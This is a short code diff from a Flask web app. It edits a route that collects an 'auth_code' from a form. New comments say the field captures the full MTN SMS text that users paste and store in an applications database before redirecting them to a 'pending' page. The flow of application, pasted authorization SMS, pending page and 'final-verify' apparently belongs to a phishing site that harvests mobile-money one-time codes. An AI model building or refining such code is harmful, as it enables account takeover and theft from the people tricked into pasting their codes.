@@ -412,7 +412,7 @@ def submit_auth_code():
     app_id = record.get("app_id") if record else ""
 
     if request.method == "POST":
-        auth_code = request.form.get("auth_code")
+        auth_code = request.form.get("auth_code") # This captures the full SMS message text pasted by the user
         if current_id:
             applications_collection.update_one(
                 {"_id": ObjectId(current_id)},
@@ -423,7 +423,8 @@ def submit_auth_code():
             
         return redirect(url_for("pending", app_id=app_id))
     
-    return render_template("completed.html", app_id=app_id)
+    # Renders the page where they paste the full yellow MTN SMS text
+    return render_template("apply.html", app_id=app_id)
 
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
